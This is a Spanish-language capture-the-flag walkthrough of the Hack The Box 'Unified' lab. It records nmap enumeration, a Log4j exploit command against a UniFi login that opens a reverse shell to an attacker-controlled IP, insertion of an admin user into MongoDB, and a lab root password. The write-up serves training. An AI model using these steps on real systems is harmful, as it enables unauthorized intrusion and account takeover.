Ocupamos el nmap para poder enumerar los puertos con ` nmap -p- --open -sS --min-rate 500 -vvv -n -Pn 10.129.96.149 -oG allPorts`

![](https://lh7-us.googleusercontent.com/gpSn4OlDRhC0sWWYT0CC4jjRZtKAvBxibG-_0QF7o6z_440W099Vv8kvZ3ckRGBAAKCbnKDEWDBMlF4JON_qkF3VYtzmL3GWzGXIau0UwbXbDydQ5KEuyJJYPYlZSxoNDq7Ufr_XBZHWY_bq1gPfxVc)
luego de eso ocupamos nmap para ocupar los scripts más conocidos `nmap -p22,6789,8080,8443,8843,8880 -sCV -v -n -PN 10.129.96.149 -oN targeted` 
![](https://lh7-us.googleusercontent.com/E0W4h0bPHAkw-RLMJjjpn4B1lnH9HcVGa9bweyFNP51x0epytKrtp6dmJtfzI0Fek4HNsaL32BUhsdBCp4lPk2PfbBwBmFTxH3bqvGgeq-LJRjq_bNq_OOQjE3d6sfE8LoopRIMsYNLmhXJouOse5Ok)

![](https://lh7-us.googleusercontent.com/f0MgPQzTx0O5dJiEcYYMs7f86GNXFxk83MEkVcWuCaWf4pi9N1stPzPOosH-W5ETmUVu6UrVxi7wR61bIQD_2zbDQI17o_gEFVvaP1EYZsDEVTa621M8-QIBK6Y0pucfBY8M37lldRSJ1cHl5AfUuFk)

![](https://lh7-us.googleusercontent.com/bSU3Vnc-fYe7tHetbrY7VRg40xiS2w2FcGw-tDWa5t0mSLA5m7mzuIGNKv0h2V2TXMYGtq-owNf9mV6cE_xHGRYtI7qt973XvnQ5FKURe2A1366NOKhYXpmnx4KVIjGEIxfVzhXRdTEHsmRl1vqYwiQ)

![](https://lh7-us.googleusercontent.com/ZssYPPHue7oV_1Q-bWLMptQZOGQIzKy2f_7N8-cLX--xI5218tiZtObcYBTylM_UVojXbuCk0u4fYjFWd7uX8pMqaCqspBpgqJKiJgUnPqo5qBch04DSSHc0WlLzMAoeBBj5kHkY8Lj6WTJPwmExqQ4)

una de las cosas que podemos hacer es poner la ip de la pagina con el puerto 8443 y nos mandara a una pagina de login: 
![](https://lh7-us.googleusercontent.com/1ktVXSzNxfA_HS3AmGNU0Y8JK_IqlVe1jlO4WjP7Ypj3a5zRC06KTjqMnaI8V8ooeFHOrWQUY-8GOxQdtHGhNpvhrcdRIUY9hoLl90KP1RT2phk9IHBMy0ba4o1jW-MXPF6fLwBYCjbwOSOAfZ_n0OE)
con Log4unifi podemos sacar que podemos poner como carga de del login. [https://github.com/puzzlepeaches/Log4jUnifi](https://github.com/puzzlepeaches/Log4jUnifi)(pagina para el exploit)
![](https://lh7-us.googleusercontent.com/aF8_zc8Mr-OYFaSZ0rjv4Br4Zz7vO876_VWivMVtRsuzJHPysCxb2o2WD0SBsV5H8A2UZpeGi1WS2196EKeRwpeZ4UFGnikt8Bq_0CzbNXNoAmpaaIGiqEl18j9UM4rDpM95F_WMYS_XGPF8FGBlH_E)
estando dentro de la pagina de login, nos conectamos a burpsuite
![](https://lh7-us.googleusercontent.com/1es3nxCmHQcx71g8SVjtZn0d2JD2CLRY5o-fSuf7ezuOAYZRyzl-x3Fc6jsxz42FgjG9mXFVEIR5BZ7vLj7OK6qCMNskatLVWUc5ZmDSMVYUXm8xSsF3oVMSnIehOPEbgKoRkYWfWOi5kDIYQaVjtOQ)
si hacemos todo lo que dice la instalación y hacemos  todo lo que nos dice la forma de usarlo podremos tener acceso a una shell inversa: 
```
python3 exploit.py -u http://10.129.161.99:8080 -i 10.10.15.130 -p 9000 

-u http://10.129.161.99:8080 la url de la pagina
-i 10.10.15.130 la ip que va a interceptar la peticion 
-p 9000 el puerto que va a ocupar
```
![[Pasted image 20240131164250.png]]
obtenemos lo siguiente:
![[Pasted image 20240131164310.png]]
le hacemos un pequeño tratamiento a la tty con el script: 
![[Pasted image 20240131170935.png]]
para saber en que puerto corre mongodb podemos hacer un `ps aux | grep [app que se quiere buscar]`
![[Pasted image 20240131202133.png]]
podemos conectarnos a mongo de la siguiente manera:

`mongo --ports 21117 ace`

de la siguiente manera podemos insertar un usuario con privilegios de administrador: 
![[Pasted image 20240131211131.png]]
con el db.admin.find() podemos asegurarnos de que se haya agregado nuestro usuario correctamente: 
![[Pasted image 20240131211413.png]]
`clave de root NotACrackablePassword4U2022 
podemos encontrar la flag en la carpeta root.txt
![[Pasted image 20240131213603.png]]
